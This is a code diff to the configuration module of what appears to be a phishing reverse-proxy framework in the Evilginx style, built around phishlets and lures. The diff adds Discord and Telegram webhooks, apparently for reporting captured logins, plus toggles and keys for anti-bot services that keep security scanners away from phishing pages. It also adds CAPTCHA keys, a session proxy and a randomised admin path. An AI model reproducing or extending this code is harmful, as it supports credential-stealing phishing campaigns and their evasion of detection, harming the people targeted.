@@ -2,6 +2,7 @@ package core
 
 import (
 	"fmt"
+	"math/rand"
 	"os"
 	"path/filepath"
 	"strings"
@@ -34,6 +35,7 @@ type Config struct {
 	proxyPort         int
 	proxyUsername     string
 	proxyPassword     string
+	proxySession      bool
 	blackListMode     string
 	proxyEnabled      bool
 	sitesEnabled      map[string]bool
@@ -48,6 +50,20 @@ type Config struct {
 	templatesDir      string
 	lures             []*Lure
 	cfg               *viper.Viper
+	webhook_discord   string
+	webhook_telegram  string
+	webhook_verbosity int
+	simplebotEnabled  bool
+	nkpbotEnabled     bool
+	killbotEnabled    bool
+	killbot_apikey    string
+	antibotpwEnabled  bool
+	antibotpw_apikey  string
+	adminpage_path    string
+	turnstile_sitekey string
+	turnstile_privkey string
+	recaptcha_sitekey string
+	recaptcha_privkey string
 }
 
 const (
@@ -67,12 +83,27 @@ const (
 	CFG_PROXY_USERNAME     = "proxy_username"
 	CFG_PROXY_PASSWORD     = "proxy_password"
 	CFG_PROXY_ENABLED      = "proxy_enabled"
+	CFG_PROXY_SESSION      = "proxy_session"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
+	CFG_WEBHOOK_VERBOSITY  = "webhook_verbosity"
+	CFG_WEBHOOK_TELEGRAM   = "webhook_telegram"
+	CFG_WEBHOOK_DISCORD    = "webhook_discord"
+	CFG_SIMPLEBOT_ENABLED  = "simplebot_enabled"
+	CFG_NKPBOT_ENABLED     = "nkpbot_enabled"
+	CFG_KILLBOT_ENABLED    = "killbot_enabled"
+	CFG_KILLBOT_APIKEY     = "killbot_apikey"
+	CFG_ANTIBOTPW_ENABLED  = "antibotpw_enabled"
+	CFG_ANTIBOTPW_APIKEY   = "antibotpw_apikey"
+	CFG_ADMINPAGE_PATH     = "adminpage_path"
+	CFG_TURNSTILE_SITEKEY  = "turnstile_sitekey"
+	CFG_TURNSTILE_PRIVKEY  = "turnstile_privkey"
+	CFG_RECAPTCHA_SITEKEY  = "recaptcha_sitekey"
+	CFG_RECAPTCHA_PRIVKEY  = "recaptcha_privkey"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
-func NewConfig(cfg_dir string, path string) (*Config, error) {
+func NewConfig(cfg_dir, path string) (*Config, error) {
 	c := &Config{
 		siteDomains:   make(map[string]string),
 		sitesEnabled:  make(map[string]bool),
@@ -88,7 +119,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if path == "" {
 		path = filepath.Join(cfg_dir, "config.yaml")
 	}
-	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
+	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0o700))
 	if err != nil {
 		return nil, err
 	}
@@ -120,7 +151,25 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.proxyUsername = c.cfg.GetString(CFG_PROXY_USERNAME)
 	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
 	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
+	c.proxySession = c.cfg.GetBool(CFG_PROXY_SESSION)
 	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
+	c.webhook_verbosity = c.cfg.GetInt(CFG_WEBHOOK_VERBOSITY)
+	c.webhook_discord = c.cfg.GetString(CFG_WEBHOOK_DISCORD)
+	c.webhook_telegram = c.cfg.GetString(CFG_WEBHOOK_TELEGRAM)
+	//
+	c.simplebotEnabled = c.cfg.GetBool(CFG_SIMPLEBOT_ENABLED)
+	c.nkpbotEnabled = c.cfg.GetBool(CFG_NKPBOT_ENABLED)
+	c.killbotEnabled = c.cfg.GetBool(CFG_KILLBOT_ENABLED)
+	c.killbot_apikey = c.cfg.GetString(CFG_KILLBOT_APIKEY)
+	c.antibotpwEnabled = c.cfg.GetBool(CFG_ANTIBOTPW_ENABLED)
+	c.antibotpw_apikey = c.cfg.GetString(CFG_ANTIBOTPW_APIKEY)
+	//
+	c.adminpage_path = c.cfg.GetString(CFG_ADMINPAGE_PATH)
+	c.turnstile_sitekey = c.cfg.GetString(CFG_TURNSTILE_SITEKEY)
+	c.turnstile_privkey = c.cfg.GetString(CFG_TURNSTILE_PRIVKEY)
+	c.recaptcha_sitekey = c.cfg.GetString(CFG_RECAPTCHA_SITEKEY)
+	c.recaptcha_privkey = c.cfg.GetString(CFG_RECAPTCHA_PRIVKEY)
+
 	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
 	for _, site := range s_enabled {
 		c.sitesEnabled[site] = true
@@ -155,12 +204,19 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
 	}
 	c.lures = []*Lure{}
-	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
+	err = c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
+	if err != nil {
+		return nil, err
+	}
+
+	if c.adminpage_path == "" {
+		c.SetAdminpagePath(fmt.Sprintf("%v", rand.Intn(9999)))
+	}
 
 	return c, nil
 }
 
-func (c *Config) SetSiteHostname(site string, domain string) bool {
+func (c *Config) SetSiteHostname(site, domain string) bool {
 	if c.baseDomain == "" {
 		log.Error("you need to set server domain, first. type: server your-domain.com")
 		return false
@@ -176,7 +232,10 @@ func (c *Config) SetSiteHostname(site string, domain string) bool {
 	c.siteDomains[site] = domain
 	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
 	log.Info("phishlet '%s' hostname set to: %s", site, domain)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 	return true
 }
 
@@ -184,14 +243,20 @@ func (c *Config) SetBaseDomain(domain string) {
 	c.baseDomain = domain
 	c.cfg.Set(CFG_BASE_DOMAIN, c.baseDomain)
 	log.Info("server domain set to: %s", domain)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetServerIP(ip_addr string) {
 	c.serverIP = ip_addr
 	c.cfg.Set(CFG_SERVER_IP, c.serverIP)
 	log.Info("server IP set to: %s", ip_addr)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) EnableProxy(enabled bool) {
@@ -202,7 +267,28 @@ func (c *Config) EnableProxy(enabled bool) {
 	} else {
 		log.Info("disabled proxy")
 	}
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) EnableSessionProxy(enabled bool) {
+	c.proxySession = enabled
+	c.cfg.Set(CFG_PROXY_SESSION, c.proxySession)
+	if enabled {
+		log.Info("enabled session proxy")
+	} else {
+		log.Info("disabled session proxy")
+	}
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) GetSessionProxy() bool {
+	return c.proxySession
 }
 
 func (c *Config) SetProxyType(ptype string) {
@@ -214,35 +300,50 @@ func (c *Config) SetProxyType(ptype string) {
 	c.proxyType = ptype
 	c.cfg.Set(CFG_PROXY_TYPE, c.proxyType)
 	log.Info("proxy type set to: %s", c.proxyType)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetProxyAddress(address string) {
 	c.proxyAddress = address
 	c.cfg.Set(CFG_PROXY_ADDRESS, c.proxyAddress)
 	log.Info("proxy address set to: %s", c.proxyAddress)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetProxyPort(port int) {
 	c.proxyPort = port
 	c.cfg.Set(CFG_PROXY_PORT, c.proxyPort)
 	log.Info("proxy port set to: %d", c.proxyPort)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetProxyUsername(username string) {
 	c.proxyUsername = username
 	c.cfg.Set(CFG_PROXY_USERNAME, c.proxyUsername)
 	log.Info("proxy username set to: %s", c.proxyUsername)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetProxyPassword(password string) {
 	c.proxyPassword = password
 	c.cfg.Set(CFG_PROXY_PASSWORD, c.proxyPassword)
 	log.Info("proxy password set to: %s", c.proxyPassword)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) IsLureHostnameValid(hostname string) bool {
@@ -266,12 +367,15 @@ func (c *Config) SetSiteEnabled(site string) error {
 	}
 	c.refreshActiveHostnames()
 	var sites []string
-	for s, _ := range c.sitesEnabled {
+	for s := range c.sitesEnabled {
 		sites = append(sites, s)
 	}
 	c.cfg.Set(CFG_SITES_ENABLED, sites)
 	log.Info("enabled phishlet '%s'", site)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -285,12 +389,15 @@ func (c *Config) SetSiteDisabled(site string) error {
 	}
 	c.refreshActiveHostnames()
 	var sites []string
-	for s, _ := range c.sitesEnabled {
+	for s := range c.sitesEnabled {
 		sites = append(sites, s)
 	}
 	c.cfg.Set(CFG_SITES_ENABLED, sites)
 	log.Info("disabled phishlet '%s'", site)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -310,7 +417,7 @@ func (c *Config) SetSiteHidden(site string, hide bool) error {
 	}
 	c.refreshActiveHostnames()
 	var sites []string
-	for s, _ := range c.sitesHidden {
+	for s := range c.sitesHidden {
 		sites = append(sites, s)
 	}
 	c.cfg.Set(CFG_SITES_HIDDEN, sites)
@@ -319,7 +426,10 @@ func (c *Config) SetSiteHidden(site string, hide bool) error {
 	} else {
 		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
 	}
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -328,14 +438,20 @@ func (c *Config) SetTemplatesDir(path string) {
 }
 
 func (c *Config) ResetAllSites() {
-	for s, _ := range c.sitesEnabled {
-		c.SetSiteDisabled(s)
+	for s := range c.sitesEnabled {
+		err := c.SetSiteDisabled(s)
+		if err != nil {
+			log.Error("disabling: %s resulted in error: %s", s, err)
+		}
 	}
-	for s, _ := range c.phishlets {
+	for s := range c.phishlets {
 		c.siteDomains[s] = ""
 	}
 	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) IsSiteEnabled(site string) bool {
@@ -356,7 +472,7 @@ func (c *Config) IsSiteHidden(site string) bool {
 
 func (c *Config) GetEnabledSites() []string {
 	var sites []string
-	for s, _ := range c.sitesEnabled {
+	for s := range c.sitesEnabled {
 		sites = append(sites, s)
 	}
 	return sites
@@ -366,14 +482,20 @@ func (c *Config) SetRedirectParam(param string) {
 	c.redirectParam = param
 	c.cfg.Set(CFG_REDIRECT_PARAM, param)
 	log.Info("redirect parameter set to: %s", param)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetBlacklistMode(mode string) {
 	if stringExists(mode, []string{"all", "unauth", "off"}) {
 		c.blackListMode = mode
 		c.cfg.Set(CFG_BLACKLIST_MODE, mode)
-		c.cfg.WriteConfig()
+		err := c.cfg.WriteConfig()
+		if err != nil {
+			log.Error("write config: %v", err)
+		}
 	}
 	log.Info("blacklist mode set to: %s", mode)
 }
@@ -382,21 +504,231 @@ func (c *Config) SetVerificationParam(param string) {
 	c.verificationParam = param
 	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
 	log.Info("verification parameter set to: %s", param)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetVerificationToken(token string) {
 	c.verificationToken = token
 	c.cfg.Set(CFG_VERIFICATION_TOKEN, token)
 	log.Info("verification token set to: %s", token)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetWebhookVerbosity(verbosity int) {
+	c.webhook_verbosity = verbosity
+	c.cfg.Set(CFG_WEBHOOK_VERBOSITY, verbosity)
+	log.Info("webhook verbosity set to: %s", fmt.Sprint(verbosity))
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetWebhookDiscord(webhook string) {
+	c.webhook_discord = webhook
+	c.cfg.Set(CFG_WEBHOOK_DISCORD, webhook)
+	log.Info("discord webhook set to: %s", webhook)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetWebhookTelegram(webhook string) {
+	c.webhook_telegram = webhook
+	c.cfg.Set(CFG_WEBHOOK_TELEGRAM, webhook)
+	log.Info("telegram webhook set to: %s", webhook)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetTurnstileSitekey(key string) {
+	c.turnstile_sitekey = key
+	c.cfg.Set(CFG_TURNSTILE_SITEKEY, key)
+	log.Info("Turnstile site key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetTurnstilePrivkey(key string) {
+	c.turnstile_privkey = key
+	c.cfg.Set(CFG_TURNSTILE_PRIVKEY, key)
+	log.Info("Turnstile private key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetReCaptchaSitekey(key string) {
+	c.recaptcha_sitekey = key
+	c.cfg.Set(CFG_RECAPTCHA_SITEKEY, key)
+	log.Info("reCAPTCHA site key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetReCaptchaPrivkey(key string) {
+	c.recaptcha_privkey = key
+	c.cfg.Set(CFG_RECAPTCHA_PRIVKEY, key)
+	log.Info("reCAPTCHA private key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) ToggleSimpleBot() {
+	enable := true
+	if c.simplebotEnabled {
+		enable = false
+	}
+	c.simplebotEnabled = enable
+	c.cfg.Set(CFG_SIMPLEBOT_ENABLED, enable)
+	if enable {
+		log.Info("enabled simplebot aversion")
+	} else {
+		log.Info("disabled simplebot aversion")
+	}
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) ToggleNkpBot() {
+	enable := true
+	if c.nkpbotEnabled {
+		enable = false
+	}
+	c.nkpbotEnabled = enable
+	c.cfg.Set(CFG_NKPBOT_ENABLED, enable)
+	if enable {
+		log.Info("enabled nkpbot aversion")
+	} else {
+		log.Info("disabled nkpbot aversion")
+	}
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) ToggleAntibotPw() {
+	enable := true
+	if c.antibotpwEnabled {
+		enable = false
+	}
+	if enable {
+		if key_length := len(c.antibotpw_apikey); key_length != 32 {
+			log.Error("error: antibotpw api key should be 32 characters but is %v", key_length)
+			log.Info("disabled antibot.pw aversion")
+			c.antibotpwEnabled = enable
+			c.cfg.Set(CFG_ANTIBOTPW_ENABLED, c.antibotpwEnabled)
+			err := c.cfg.WriteConfig()
+			if err != nil {
+				log.Error("write config: %v", err)
+			}
+			return
+		}
+		log.Info("enabled antibot.pw aversion")
+	} else {
+		log.Info("disabled antibot.pw aversion")
+	}
+	c.antibotpwEnabled = enable
+	c.cfg.Set(CFG_ANTIBOTPW_ENABLED, c.antibotpwEnabled)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetAntiBotPwApikey(key string) {
+	c.antibotpw_apikey = key
+	c.cfg.Set(CFG_ANTIBOTPW_APIKEY, key)
+	log.Info("antibotpw key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) GetAntiBotPwApikey() string {
+	return c.antibotpw_apikey
+}
+
+func (c *Config) ToggleKillbot() {
+	enable := true
+	if c.killbotEnabled {
+		enable = false
+	}
+	c.killbotEnabled = enable
+	if enable {
+		if key_length := len(c.killbot_apikey); key_length != 45 {
+			log.Error("killbot api key should be 45 characters but is %v", key_length)
+			log.Info("disabled killbot")
+			c.cfg.Set(CFG_KILLBOT_ENABLED, c.killbotEnabled)
+			err := c.cfg.WriteConfig()
+			if err != nil {
+				log.Error("write config: %v", err)
+			}
+			return
+		}
+		log.Info("enabled killbot")
+	} else {
+		log.Info("disabled killbot")
+	}
+	c.cfg.Set(CFG_KILLBOT_ENABLED, c.killbotEnabled)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetKillBotApikey(key string) {
+	c.killbot_apikey = key
+	c.cfg.Set(CFG_KILLBOT_APIKEY, key)
+	log.Info("killbot key set to: %s", key)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) GetKillBotApikey() string {
+	return c.killbot_apikey
 }
 
 func (c *Config) SetRedirectUrl(url string) {
 	c.redirectUrl = url
 	c.cfg.Set(CFG_REDIRECT_URL, url)
 	log.Info("unauthorized request redirection URL set to: %s", url)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+func (c *Config) SetAdminpagePath(path string) {
+	c.adminpage_path = path
+	c.cfg.Set(CFG_ADMINPAGE_PATH, path)
+	log.Info("adminpage authorization path set to: %s", path)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) refreshActiveHostnames() {
@@ -407,9 +739,7 @@ func (c *Config) refreshActiveHostnames() {
 		if err != nil {
 			continue
 		}
-		for _, host := range pl.GetPhishHosts() {
-			c.activeHostnames = append(c.activeHostnames, host)
-		}
+		c.activeHostnames = append(c.activeHostnames, pl.GetPhishHosts()...)
 	}
 	for _, l := range c.lures {
 		if stringExists(l.Phishlet, sites) {
@@ -440,7 +770,10 @@ func (c *Config) AddPhishlet(site string, pl *Phishlet) {
 func (c *Config) AddLure(site string, l *Lure) {
 	c.lures = append(c.lures, l)
 	c.cfg.Set(CFG_LURES, c.lures)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
 }
 
 func (c *Config) SetLure(index int, l *Lure) error {
@@ -450,7 +783,10 @@ func (c *Config) SetLure(index int, l *Lure) error {
 		return fmt.Errorf("index out of bounds: %d", index)
 	}
 	c.cfg.Set(CFG_LURES, c.lures)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -461,7 +797,10 @@ func (c *Config) DeleteLure(index int) error {
 		return fmt.Errorf("index out of bounds: %d", index)
 	}
 	c.cfg.Set(CFG_LURES, c.lures)
-	c.cfg.WriteConfig()
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -478,7 +817,10 @@ func (c *Config) DeleteLures(index []int) []int {
 	if len(di) > 0 {
 		c.lures = tlures
 		c.cfg.Set(CFG_LURES, c.lures)
-		c.cfg.WriteConfig()
+		err := c.cfg.WriteConfig()
+		if err != nil {
+			log.Error("write config: %v", err)
+		}
 	}
 	return di
 }
@@ -491,7 +833,7 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
 			if l.Path == path {
